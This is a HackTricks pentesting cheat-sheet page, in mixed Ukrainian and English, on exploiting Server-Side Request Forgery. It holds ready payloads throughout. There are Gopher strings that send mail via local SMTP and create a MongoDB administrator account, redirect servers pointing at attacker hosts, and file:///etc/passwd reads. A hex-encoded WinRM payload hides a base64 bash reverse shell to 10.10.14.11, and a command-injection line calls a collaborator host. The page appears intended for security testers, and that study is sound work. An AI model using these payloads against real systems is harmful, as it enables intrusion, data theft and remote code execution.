# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація

A **Server-side Request Forgery (SSRF)** vulnerability occurs when an attacker manipulates a **server-side application** into making **HTTP requests** to a domain of their choice. This vulnerability exposes the server to arbitrary external requests directed by the attacker.

## Capture SSRF

Перше, що потрібно зробити — це зафіксувати SSRF-взаємодію, яку ви ініціювали. Щоб зловити HTTP або DNS взаємодію, можна використовувати такі інструменти:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Whitelisted Domains Bypass

Зазвичай ви виявите, що SSRF працює лише для **певних whitelisted доменів** або URL. На наступній сторінці наведена **підбірка технік для спроби обійти цей whitelist**:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Bypass via open redirect

Якщо сервер правильно захищений, ви можете **обійти всі обмеження, експлуатуючи Open Redirect на веб-сторінці**. Оскільки сторінка дозволяє **SSRF до того ж домену** і, ймовірно, буде **follow redirects**, ви можете використати **Open Redirect, щоб змусити сервер звернутися до будь-якого внутрішнього ресурсу**.\
Read more here: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Protocols

- **file://**
- The URL scheme `file://` is referenced, pointing directly to `/etc/passwd`: `file:///etc/passwd`
- **dict://**
- The DICT URL scheme is described as being utilized for accessing definitions or word lists via the DICT protocol. An example given illustrates a constructed URL targeting a specific word, database, and entry number, as well as an instance of a PHP script being potentially misused to connect to a DICT server using attacker-provided credentials: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Identified as a protocol for secure file transfer over secure shell, an example is provided showcasing how a PHP script could be exploited to connect to a malicious SFTP server: `url=sftp://generic.com:11111/`
- **TFTP://**
- Trivial File Transfer Protocol, operating over UDP, is mentioned with an example of a PHP script designed to send a request to a TFTP server. A TFTP request is made to 'generic.com' on port '12346' for the file 'TESTUDPPACKET': `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- This segment covers the Lightweight Directory Access Protocol, emphasizing its use for managing and accessing distributed directory information services over IP networks.Interact with an LDAP server on localhost: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- A method is described for exploiting SSRF vulnerabilities to interact with SMTP services on localhost, including steps to reveal internal domain names and further investigative actions based on that information.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- Якщо SSRF виконується через **curl**, у curl є функція під назвою [**URL globbing**](https://everything.curl.dev/cmdline/globbing), яка може бути корисною для обходу WAFs. Наприклад, у цьому [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) ви знайдете приклад для **path traversal via `file` protocol**:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Обговорюється здатність протоколу Gopher вказувати **IP, port and bytes** для зв'язку із сервером, а також інструменти на кшталт [Gopherus](https://github.com/tarunkant/Gopherus) та [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) для створення payloads. Ілюстровано два різні випадки використання:

### Gopher://

За допомогою цього протоколу ви можете вказати **IP, port and bytes**, які ви хочете, щоб сервер **send**. Потім, по суті, ви можете експлуатувати SSRF, щоб **communicate with any TCP server** (але спочатку потрібно знати, як говорити з сервісом).\
На щастя, ви можете використати [Gopherus](https://github.com/tarunkant/Gopherus) для створення payloads для кількох сервісів. Додатково, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) може бути використаний для створення _gopher_ payloads для _Java RMI_ сервісів.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Back connect to 1337**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- Створити користувача з username=admin, password=admin123 та permission=administrator
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF через Referrer header та інші

Аналітичне програмне забезпечення на серверах часто записує Referrer header для відстеження вхідних посилань, що ненавмисно піддає додатки вразливостям Server-Side Request Forgery (SSRF). Це тому, що таке програмне забезпечення може відвідувати зовнішні URL, зазначені в Referrer header, щоб аналізувати вміст реферального сайту. Щоб виявити ці вразливості, рекомендується плагін Burp Suite "**Collaborator Everywhere**", що використовує спосіб обробки Referer header аналітичними інструментами для ідентифікації потенційних поверхонь атак SSRF.

## SSRF через SNI-дані сертифіката

Помилкове налаштування, яке може дозволити підключення до будь-якого бекенду за простого конфігурування, ілюструється прикладом конфігурації Nginx:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
У цій конфігурації значення з поля Server Name Indication (SNI) безпосередньо використовується як адреса бекенда. Така конфігурація відкриває вразливість до Server-Side Request Forgery (SSRF), якою можна скористатися просто вказавши потрібну IP-адресу або доменне ім'я в полі SNI. Нижче наведено приклад експлуатації, який змушує встановити з'єднання з довільним бекендом, наприклад `internal.host.com`, за допомогою команди `openssl`:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## SSRF через TLS AIA CA Issuers (Java mTLS)

Деякі TLS-стеки автоматично завантажують відсутні проміжні CA, використовуючи URI **Authority Information Access (AIA) → CA Issuers** у сертифікаті peer. В **Java**, увімкнення `-Dcom.sun.security.enableAIAcaIssuers=true` під час запуску mTLS сервісу змушує сервер робити dereference attacker-контрольованих URI з клієнтського сертифіката **під час handshake**, до запуску будь-якої HTTP-логіки.

- **Requirements**: mTLS enabled, Java AIA fetching enabled, attacker can present a client cert with a crafted AIA CA Issuers URI.
- **Triggering SSRF** (Java 21 example):
```bash
java -Djava.security.debug=certpath \
-Dcom.sun.security.enableAIAcaIssuers=true \
-Dhttp.agent="AIA CA Issuers PoC" -jar server.jar
# Attacker cert AIA: http://localhost:8080
nc -l 8080 -k                      # observe the outbound fetch
curl https://mtls-server:8444 --key client-aia-key.pem --cert client-aia-localhost-cert.pem --cacert ca-cert.pem
```
У відладочному виводі Java certpath видно `CertStore URI:http://localhost:8080`, а `nc` захоплює HTTP-запит з керованим `User-Agent` з `-Dhttp.agent`, що доводить SSRF під час валідації сертифіката.
- **DoS via file://**: встановлення AIA CA Issuers на `file:///dev/urandom` на Unix-подібних хостах змушує Java трактувати це як CertStore і читати необмежену кількість випадкових байтів, завантажуючи одне CPU-ядро і блокуючи наступні з'єднання навіть після відключення клієнта.

## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF з Command Injection

Можна спробувати payload на кшталт: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## Рендеринг PDF

Якщо веб-сторінка автоматично створює PDF з інформацією, яку ви надали, ви можете **вставити JS, який буде виконаний самим PDF creator'ом** (сервером) під час створення PDF і таким чином скористатися SSRF. [**Find more information here**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## Від SSRF до DoS

Створіть кілька сесій і спробуйте завантажити важкі файли, експлуатуючи SSRF з цих сесій.

## SSRF PHP Functions

Перегляньте наступну сторінку щодо вразливих PHP і навіть Wordpress функцій:


{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF Redirect to Gopher

Для деяких експлуатацій може знадобитися **send a redirect response** (наприклад, щоб використати інший протокол, такий як gopher). Нижче наведені різні python коди для відповіді з redirect:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## Неправильно сконфігуровані проксі для SSRF

Трюки [**з цього посту**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Вразливий код проксі Flask</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask дозволяє використовувати **`@`** як початковий символ, що дає змогу зробити **початковий host name — username** і inject новий. Attack request:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Вразливий код:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

Було виявлено, що можливо **розпочати шлях** запиту символом **`;`**, що дозволяє потім використовувати **`@`** і ввести новий host для доступу. Запит атаки:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### PHP Built-in Web Server <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Уразливий PHP код</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP дозволяє використання **символу `*` перед слешем у шляху** URL, проте має інші обмеження: його можна використовувати лише для кореневого шляху `/`, і крапки `.` не дозволені перед першим слешем, тому, наприклад, потрібно використовувати IP-адресу, закодовану у dotless-hex:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

If you are having **problems** to **exfiltrate content from a local IP** because of **CORS/SOP**, **DNS Rebidding** can be used to bypass that limitation:


{{#ref}}
../cors-bypass.md
{{#endref}}

### Автоматизований DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) — це інструмент для виконання [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) атак. Він включає необхідні компоненти, щоб rebind the IP address of the attack server DNS name to the target machine's IP address та доставляти attack payloads для exploit уразливого ПО на цільовій машині.

Також перегляньте **публічно доступний сервер** на [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Вимоги:

- **SSRF**
- **Outbound TLS sessions**
- Services on local ports

Атака:

1. Попросіть користувача/бота **access** a **domain** controlled by the **attacker**
2. **TTL** запису **DNS** встановлено в **0** сек (тому жертва незабаром знову перевірятиме IP домену)
3. Встановлюється **TLS connection** між жертвою та доменом атакара. Атакер вводить **payload inside** **Session ID or Session Ticket**.
4. **Domain** запускає **infinite loop** редиректів проти самого себе. Мета — змусити користувача/бота звертатися до домену доти, поки він **again** не виконає **DNS request** для цього домену.
5. У наступному DNS-запиті тепер повертається **private IP** (наприклад 127.0.0.1)
6. Користувач/бот спробує **reestablish the TLS connection** і при цьому відправить **Session** ID/Ticket ID (де містився **payload** атакара). Вітаємо — ви змусили **user/bot attack himself**.

Зверніть увагу, що під час цієї атаки, якщо ви хочете атакувати localhost:11211 (_memcache_), потрібно змусити жертву встановити початкове з'єднання з www.attacker.com:11211 (порт має залишатися **the same**).\
Щоб **perform this attack you can use the tool**: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
Для **more information** перегляньте доповідь, де ця атака пояснюється: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

Різниця між blind SSRF і не-blind полягає в тому, що при blind ви не бачите відповіді на SSRF-запит. Тому експлуатація складніша — можна використовувати переважно відомі вразливості.

### Time based SSRF

**Checking the time** відповіді від сервера може дозволити **possible to know if a resource exists or not** (можливо, доступ до існуючого ресурсу займає більше часу, ніж до неіснуючого).

### Від Blind до повного зловживання кодами статусу

Відповідно до цього [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/), деякі blind SSRF можуть виникати тому, що хоча цільовий URL відповідає зі статусом 200 (наприклад AWS metadata), ці дані неправильно відформатовані і додаток може відмовитися їх показувати.

Однак було виявлено, що відправка редирект-відповідей зі статусами від 305 до 309 у SSRF може змусити додаток **follow these redirects while entering an error mode**, після чого він більше не перевірятиме формат даних і може просто вивести їх.

The python server used to exploit this is the following:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**Steps:**
- First 302 gets the app to start following.
- Then it receives 305 → 306 → 307 → 308 → 309 → 310.
- After the 5th strange code the PoC finally returns 302 → 169.254.169.254 → 200 OK.

**What happens inside the target:**
- libcurl itself does follow 305–310; it just normalises unknown codes to “follow.”
- After N weird redirects (≥ 5 here) the application’s own wrapper decides “something is off” and switches to an error mode meant for debugging.
- In that mode it dumps the entire redirect chain plus final body back to the outside caller.
- Result: attacker sees every header + the metadata JSON, mission accomplished.

Note that this is interesting to leak status codes that you couldn't leak before (like a 200). However, if somehow you could also select the status code of the response (imagine that you can decide that the AWS metadata responds with a 500 status code), **можуть існувати status codes, які безпосередньо leak вміст відповіді.**

### HTML-to-PDF renderers as blind SSRF gadgets

Libraries such as **TCPDF** (and wrappers like **spipu/html2pdf**) will automatically fetch any URLs present in attacker-controlled HTML while rendering a PDF. Each `<img>` or `<link rel="stylesheet">` attribute is resolved server-side via cURL, `getimagesize()`, or `file_get_contents()`, so you can drive the PDF worker to probe internal hosts even though no HTTP response is reflected to you.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0 здійснює кілька спроб отримання для кожного ресурсу `<img>`, тому один payload може згенерувати кілька запитів (корисно для порт-сканів, заснованих на таймінгу).
- html2pdf копіює поведінку TCPDF для `<img>` і додає отримання CSS всередині `Css::extractStyle()`, який просто викликає `file_get_contents($href)` після поверхневого перевіряння схеми. Зловживайте цим, щоб звертатися до loopback services, RFC1918 ranges або cloud metadata endpoints.
- Комбінуйте цей SSRF примітив з [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) щоб leak як внутрішні HTTP-відповіді, так і локальні файли, відображені в PDF.

Харденерам слід видаляти зовнішні URL перед рендерингом або ізолювати renderer у мережевому sandbox; допоки цього не зроблено, розглядайте PDF-генератори як blind SSRF proxies.

## Cloud SSRF Exploitation

Якщо ви знайдете SSRF-вразливість на машині, що працює в хмарному середовищі, ви можете отримати цікаву інформацію про cloud environment і навіть облікові дані:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## SSRF Vulnerable Platforms

Кілька відомих платформ містять або містили SSRF-вразливості, перевірте їх у:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Tools

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Інструмент для виявлення та експлуатації вразливостей SSRF

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

Цей інструмент генерує Gopher payloads для:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ — це сканер вразливостей _Java RMI_, який підтримує операції атаки для більшості поширених вразливостей _Java RMI_. Більшість доступних операцій підтримують опцію `--ssrf`, щоб згенерувати _SSRF_ payload для запитуваної операції. Разом з опцією `--gopher` можна безпосередньо згенерувати готові до використання _gopher_ payloads.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy — це багатопотоковий HTTP-проксі-сервер, призначений для тунелювання клієнтського HTTP-трафіку через HTTP-сервери, вразливі до Server-Side Request Forgery (SSRF).

### To practice


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## References

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [Tenable – SSRF Vulnerability in Java TLS Handshakes That Creates DoS Risk](https://www.tenable.com/blog/tenable-discovers-ssrf-vulnerability-in-java-tls-handshakes-that-creates-dos-risk)
- [RFC 5280 §4.2.2.1 Authority Information Access](https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.2.1)

{{#include ../../banners/hacktricks-training.md}}
